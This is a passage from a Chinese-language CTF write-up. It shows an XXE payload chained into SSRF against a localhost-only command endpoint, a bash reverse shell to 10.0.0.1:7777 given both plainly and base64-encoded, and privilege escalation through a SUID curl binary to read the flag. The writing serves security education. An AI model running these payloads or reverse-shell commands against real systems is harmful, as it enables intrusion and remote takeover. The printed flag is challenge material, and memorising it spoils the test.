<List>&xxe;</List>
```



能够成功读到 `/etc/passwd` 尝试读取 `/flag` 失败，考虑权限问题或者 flag 不在这个文件里

再分析一下 `/cnss/doCmd` 的 `Filter` 

只需要客户端的 IP 为 `127.0.0.1` 就可以请求这个接口， 那么正好可以利用 `XXE` 造成 `SSRF` 请求到这个接口

```java
String client = request.getRemoteAddr();
if (!client.equals(this.config.getAllow())) {
     return;
}
```



那么可以构造xml执行任意命令，不过没有回显，接下来考虑反弹shell

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ 
<!ELEMENT foo ANY >\n
<!ENTITY xxe SYSTEM "http://127.0.0.1:5000/cnss/doCmd?cmd=ls" >]>
<List>&xxe;</List>
```



注意到执行命令的时候是通过 `/bin/sh` 执行的，这里不确定 `/bin/sh` 是链接到 `bash` 还是 `dash` ，如果是  `dash` 则直接执行下面的反弹 shell 的命令会报错

```shell
bash -i >& /dev/tcp/10.0.0.1/7777 0>&1
```



但可以指定用 `bash` 执行， 到这一步， 已经拿到一个交互式的 shell 了

```shell
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS83Nzc3IDA+JjE= | base64 -d | bash
```





查看根目录文件， 可以确定 flag 位于 `/fl444444g` 文件，不过没有权限读取，考虑提权

```
cnss@3a197430eee7:/app$ ls / -al
ls / -al
total 84
drwxr-xr-x   1 root root 4096 Aug  7 14:48 .
drwxr-xr-x   1 root root 4096 Aug  7 14:48 ..
-rwxr-xr-x   1 root root    0 Aug  7 14:48 .dockerenv
drwxr-xr-x   1 root root 4096 Aug  6 02:48 app
drwxr-xr-x   1 root root 4096 Aug  7 09:39 bin
drwxr-xr-x   2 root root 4096 Jun 30 21:35 boot
drwxr-xr-x   5 root root  360 Aug  7 14:48 dev
drwxr-xr-x   1 root root 4096 Aug  7 14:48 etc
-rwx------   1 root root   70 Aug  5 20:44 fl444444g
drwxr-xr-x   2 root root 4096 Jun 30 21:35 home
drwxr-xr-x   1 root root 4096 Aug  1 00:00 lib
drwxr-xr-x   2 root root 4096 Aug  1 00:00 lib64
drwxr-xr-x   2 root root 4096 Aug  1 00:00 media
drwxr-xr-x   2 root root 4096 Aug  1 00:00 mnt
drwxr-xr-x   2 root root 4096 Aug  1 00:00 opt
dr-xr-xr-x 194 root root    0 Aug  7 14:48 proc
drwx------   1 root root 4096 Aug  2 05:54 root
drwxr-xr-x   3 root root 4096 Aug  1 00:00 run
drwxr-xr-x   1 root root 4096 Aug  2 01:47 sbin
drwxr-xr-x   2 root root 4096 Aug  1 00:00 srv
dr-xr-xr-x  13 root root    0 Aug  7 14:48 sys
drwxrwxrwt   1 root root 4096 Aug 26 18:27 tmp
drwxr-xr-x   1 root root 4096 Aug  1 00:00 usr
drwxr-xr-x   1 root root 4096 Aug  1 00:00 var
```



查看系统版本，发现这个版本并不存在可以利用的内核漏洞提权， 考虑利用 `SUID` 提权

```
cnss@3a197430eee7:/app$ uname -a
uname -a
Linux 3a197430eee7 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 GNU/Linux
```



查找具有 `SUID` 权限的文件， 发现 `curl` 具有 `SUID`

```
cnss@3a197430eee7:/app$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/curl
/usr/lib/openssh/ssh-keysign
```



用 `curl` 读 flag

```
cnss@3a197430eee7:/app$ curl file:///fl444444g
curl file:///fl444444g
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    70  100    70    0     0  70000      0 --:--:-- --:--:-- --:--:-- 70000
CNSS{5dc5330bbeac0192a8db6bf9b269470781e74aff192623e0419edfa0c5e2f8ad}
```


